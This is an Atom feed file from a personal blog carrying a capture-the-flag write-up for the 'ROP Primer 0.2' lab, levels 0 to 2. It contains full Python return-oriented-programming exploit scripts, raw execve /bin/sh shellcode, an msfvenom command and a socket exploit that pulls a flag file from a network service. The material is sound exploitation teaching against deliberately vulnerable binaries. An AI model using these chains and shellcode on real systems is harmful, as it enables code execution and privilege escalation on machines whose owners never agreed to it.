@@ -1,0 +1,336 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Rop | tcunha.github.io]]></title>
+  <link href="http://tcunha.github.io/blog/categories/rop/atom.xml" rel="self"/>
+  <link href="http://tcunha.github.io/"/>
+  <updated>2015-11-12T01:56:55+00:00</updated>
+  <id>http://tcunha.github.io/</id>
+  <author>
+    <name><![CDATA[tcunha]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[ROP Primer: 0.2]]></title>
+    <link href="http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2/"/>
+    <updated>2015-11-12T01:31:07+00:00</updated>
+    <id>http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2</id>
+    <content type="html"><![CDATA[<h2>level0</h2>
+
+<p>Started, as usual, by fetching the number of characters needed to overflow the
+name. The regular MSF pattern-create (or its alternatives like peda) approach
+can be used. In this case, consider, that 44 bytes are needed to overflow.</p>
+
+<p>The system(3) function doesn&rsquo;t seem to be linked in the library. On purpose,
+most likely. One can use the mprotect(2) system call to bypass the NX protection
+(which isn&rsquo;t allowed under PaX) on the stack by making a small portion of its
+pages as executable and read a shellcode into that location from standard input.</p>
+
+<p>The Python code below was used to create two additional (fake) stack frames:</p>
+
+<pre><code class="python">    #!/usr/bin/python
+
+    from struct import pack
+
+    off = 44
+
+    mprotectaddr = pack("&lt;L", 0x080523e0)
+    pop3 = pack("&lt;L", 0x08048882)
+    mprotectarg1 = pack("&lt;L", 0xbffdf000) # Stack address.
+    mprotectlen = pack("&lt;L", 0x100)       # Address length.
+    mprotectflgs = pack("&lt;L", 0x7)        # PROT_READ|PROT_WRITE|PROT_EXEC
+
+    readaddr = pack("&lt;L", 0x080517f0)
+    readfd = pack("&lt;L", 0x0)              # Read from standard input.
+    readbuf = mprotectarg1
+    readcnt = mprotectlen
+
+    payload = "A" * off
+    payload += mprotectaddr + pop3 + mprotectarg1 + mprotectlen + mprotectflgs
+    payload += readaddr + pop3 + readfd + readbuf + readcnt
+    payload += readbuf                    # Jump to the marked stack area.
+
+    print payload
+</code></pre>
+
+<p>The (not encoded) shellcode was generated using msfvenom:</p>
+
+<pre><code class="console">    # msfvenom -p linux/x86/exec -f py CMD=/bin/sh 2&gt;&amp;1|    \
+        tail -n+6|                                          \
+        sed -e 's,buf += ",,' -e 's,",,g'|                  \
+        tr -d '\n'
+</code></pre>
+
+<p>And, finally, executed with:</p>
+
+<pre><code class="console">    level0@rop:~$ (python boom.py; python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"'; cat)|/home/level0/level0
+    [+] ROP tutorial level0
+    [+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#!
+    cat flag
+    flag{rop_the_night_away}
+</code></pre>
+
+<h2>level1</h2>
+
+<p>This needs some code analysis at first to figure out where exactly the overflow
+occurs. The issue here is that the (specified) file&rsquo;s size (and therefore under
+control) is also being used when reading its (path) name from the socket:</p>
+
+<pre><code class="c">    char filename[32], cmd[32];
+    char text[256];
+    int read_bytes, filesize;
+    char str_filesize[7];
+
+    [...]
+
+    /* Read the file size from the socket. */
+    read(fd, &amp;str_filesize, 6);
+    filesize = atoi(str_filesize);
+    char *filebuf = malloc(filesize); &lt;---------------------+
+                                                            |
+    write_buf(fd, " Please, send your file:\n\n");          |
+    write_buf(fd, "&gt; ");                                    | related
+                                                            | to
+    /* Read the file of size filesize. */                   |
+    read_bytes = read(fd, filebuf, filesize); &lt;-------------+
+                                                            |
+    [...]                                                   |
+                                                            |
+    write_buf(fd, " Please, give a filename:\n");           | not
+    write_buf(fd, "&gt; ");                                    | related
+                                                            | to
+    /* Read the file name from the socket. */               |
+    memset(filename, 0, sizeof(filename));                  |
+    read_bytes = read(fd, filename, filesize); &lt;------------+
+</code></pre>
+
+<p>One can give a filesize of 128 bytes but provide a bigger filename (which is
+fixed at 32 bytes of size). The read(2) call should have been:</p>
+
+<pre><code class="c">    read_bytes = read(fd, filename, sizeof(filename) - 1);
+    filename[read_bytes] = '\0';
+</code></pre>
+
+<p>Keep in mind the file descriptor count of the child process:</p>
+
+<pre><code> parent
++------+
+| 0    | =&gt; stdin
+| 1    | =&gt; stdout
+| 2    | =&gt; stderr
+| 3    | =&gt; listenfd
+| 4    | =&gt; connfd (closed in the while loop before the accept call)
++------+
+
+ child
++------+
+| 0    | =&gt; stdin
+| 1    | =&gt; stdout
+| 2    | =&gt; stderr
+| 3    | =&gt; flag file fd (previously listenfd, closed in main; freed)
+| 4    | =&gt; connfd
++------+
+</code></pre>
+
+<p>Then, the addresses of the open(2), read(2) and write(2) that are used by the
+binary in the PLT section were retrieved:</p>
+
+<pre><code class="objdump">    $ objdump -D level1|grep -E "(open|read|write)@plt&gt;:"
+    08048640 &lt;read@plt&gt;:
+    080486d0 &lt;open@plt&gt;:
+    08048700 &lt;write@plt&gt;:
+</code></pre>
+
+<p>Followed by the address of an unused and writable section in the ELF file that
+<em>can</em> (data section has eight bytes only) and will hold the contents of the flag
+file:</p>
+
+<pre><code class="console">    $ readelf -S level1|grep WA
+    [19] .init_array       INIT_ARRAY      0804a2f8 0012f8 000004 00  WA  0   0  4
+    [20] .fini_array       FINI_ARRAY      0804a2fc 0012fc 000004 00  WA  0   0  4
+    [21] .jcr              PROGBITS        0804a300 001300 000004 00  WA  0   0  4
+    [22] .dynamic          DYNAMIC         0804a304 001304 0000f0 08  WA  7   0  4
+    [23] .got              PROGBITS        0804a3f4 0013f4 000004 04  WA  0   0  4
+    [24] .got.plt          PROGBITS        0804a3f8 0013f8 00006c 04  WA  0   0  4
+    [25] .data             PROGBITS        0804a464 001464 000008 00  WA  0   0  4
+    [26] .bss              NOBITS          0804a46c 00146c 000004 00  WA  0   0  4
+</code></pre>
+
+<p>0xf0 bytes is more than enough to hold the 53 bytes of the flag file. Since the
+binary also has the flag character array (NUL terminated), its address can be
+used, instead:</p>
+
+<pre><code class="objdump">    # if (strstr(filename, "flag")) &lt;== This one here.
+    $ objdump -s -j .rodata level1|grep flag
+    8049128 666c6167 00000000 20205845 52584553  flag....  XERXES
+</code></pre>
+
+<p>As for the exploit:</p>
+
+<pre><code class="python">    #!/usr/bin/python
+
+    from socket import *
+    from struct import pack
+
+    off = 64
+    pop2 = pack("&lt;L", 0x08048ef7)
+    pop3 = pack("&lt;L", 0x08048ef6)
+
+    openaddr = pack("&lt;L", 0x080486d0) # open@plt
+    openpath = pack("&lt;L", 0x08049128) # The flag string in the data section.
+    openflgs = pack("&lt;L", 0x0)        # O_RDONLY.
+
+    readaddr = pack("&lt;L", 0x08048640) # read@plt
+    readfd = pack("&lt;L", 0x3)          # Read from the newly created descriptor.
+    readbuf = pack("&lt;L", 0x0804a304)  # Read contents to the dynamic section.
+    readcnt = pack("&lt;L", 0xf0)        # Size of the dynamic ELF section.
+
+    writeaddr = pack("&lt;L", 0x08048700) # write@plt
+    writefd = pack("&lt;L", 0x4)          # Write to the original socket file descriptor.
+    writebuf = readbuf
+    writecnt = readcnt
+
+    payload = "A" * off
+    payload += openaddr + pop2 + openpath + openflgs
+    payload += readaddr + pop3 + readfd + readbuf + readcnt
+    payload += writeaddr + "BOOM" + writefd + writebuf + writecnt
+
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(("192.168.56.101", 8888))
+
+    print s.recv(1024)  # Banner.
+    s.send("store")     # The internal application command.
+    print s.recv(1024)  # How many bytes in your file?
+    s.send("128")       # Must be bigger than the 32 bytes of the filename.
+    print s.recv(1024)  # Please send your file (the contents).
+    s.send("boom")
+    print s.recv(1024)  # Error treatment and filename.
+    s.send(payload)
+    print s.recv(1024)
+    s.send("exit")      # The internal application command.
+
+    print s.recv(1024)  # To get the contents of the flag file.
+    s.close()
+</code></pre>
+
+<p>At last, called the above Python code to remotely extract the contents of the
+file:</p>
+
+<pre><code class="console">    # python boom.py 
+    Welcome to 
+
+     XERXES File Storage System
+      available commands are:
+      store, read, exit.
+
+    &gt;
+     Please, how many bytes is your file?
+
+
+    &gt;
+     Please, send your file:
+
+    &gt;
+       XERXES regrets to inform you
+        that an error occurred
+            while receiving your file.
+     Please, give a filename:
+    &gt; flag{just_one_rop_chain_a_day_keeps_the_doctor_away}
+</code></pre>
+
+<h2>level2</h2>
+
+<p>The bad characters list should be enumerated by sending them in sequence, firing
+up gdb and checking the stack values. For instance:</p>
+
+<pre><code>gdb-peda$ x/64x $esp
+0xbffff5c0:   0x04030201      0x08070605      0xbffff600      0x00000000
+                                ^^^^^^^^
+                                no \x09
+</code></pre>
+
+<p>Then, it is a matter of choosing the correct gadgets by taking into account the
+above bad characters. Decided by using the already present strcpy(3) function in
+the binary and copy the /bin/sh character array (character by character) to the
+BSS segment and using a gadget to store a NUL byte by zeroing the eax register
+first and using a mov instruction.</p>
+
+<p>Since this is running Linux x86, one can take advantage of the interrupt gadget
+by moving into eax the execve system call number and into ebx the address of the
+/bin/sh character array (which is in the BSS section).</p>
+
+<pre><code class="python">    #!/usr/bin/python
+
+    from struct import pack
+
+    off = 44
+    badchars = "\x00\x09\x0a\x20"   # List of bad characters.
+    bss = 0x080cab40                # The address of the BSS section.
+    execvenb = 11                   # System call execve number.
+
+    # Functions.
+    bssaddr = pack("&lt;L", bss)
+    strcpyaddr = pack("&lt;L", 0x08051160)
+
+    # Gadgets.
+    boom = pack("&lt;L", 0x41424344)     # dummy
+    pop2 = pack("&lt;L", 0x08048893)
+    syscall = pack("&lt;L", 0x08052ba0)
+    xoreax = pack("&lt;L", 0x0808d2cd)   # xor eax,eax|pop ebp|ret
+    inceax = pack("&lt;L", 0x08083d82)   # inc eax|ret
+    movedx = pack("&lt;L", 0x08078e71)   # mov dword ptr [edx],eax|ret
+    popedx = pack("&lt;L", 0x08052476)
+    popebx = pack("&lt;L", 0x0805249e)
+
+    # Characters.
+    slashaddr = pack("&lt;L", 0x08048483)
+    baddr = pack("&lt;L", 0x0804b262)
+    iaddr = pack("&lt;L", 0x0804a0ca)
+    naddr = pack("&lt;L", 0x08048b65)
+    saddr = pack("&lt;L", 0x08048110)
+    haddr = pack("&lt;L", 0x08048113)
+
+    payload = "A" * off
+    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 0) + slashaddr  # /
+    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 1) + baddr      # b
+    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 2) + iaddr      # i
+    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 3) + naddr      # n
+    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 4) + slashaddr  # /
+    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 5) + saddr      # s
+    payload += strcpyaddr + pop2 + pack("&lt;L", bss + 6) + haddr      # h
+    payload += xoreax + boom                # The xor gadget also pops.
+    payload += popedx + pack("&lt;L", bss + 7) # Put the address of BSS + 7.
+    payload += movedx                       # Store a NUL after the string.
+    payload += xoreax + boom                # The xor gadget also pops.
+    payload += inceax * execvenb            # eax = 11.
+    payload += popebx + bssaddr             # ebx = "/bin/sh\0"
+    payload += syscall
+
+    print payload
+</code></pre>
+
+<p>In conclusion, the execution of the SUID binary with the payload as an argument
+to capture the flag:</p>
+
+<pre><code class="console">    level2@rop:~$ ./level2 `python boom.py`
+    [+] ROP tutorial level2
+    [+] Bet you can't ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#@#
+                                                                                                 ##A#
+                                                                                                    b#B#
+                                                                                                       #C#
+                                                                                                         e#D#
+                                                                                                            ##E#
+                                                                                                               #F#
+                                                                                                               DCBAvG#
+                                                                                                                    DCBA#@#
+                                                                                                                          #!
+    # cat flag
+    flag{to_rop_or_not_to_rop}
+</code></pre>
+]]></content>
+  </entry>
+  
+</feed>
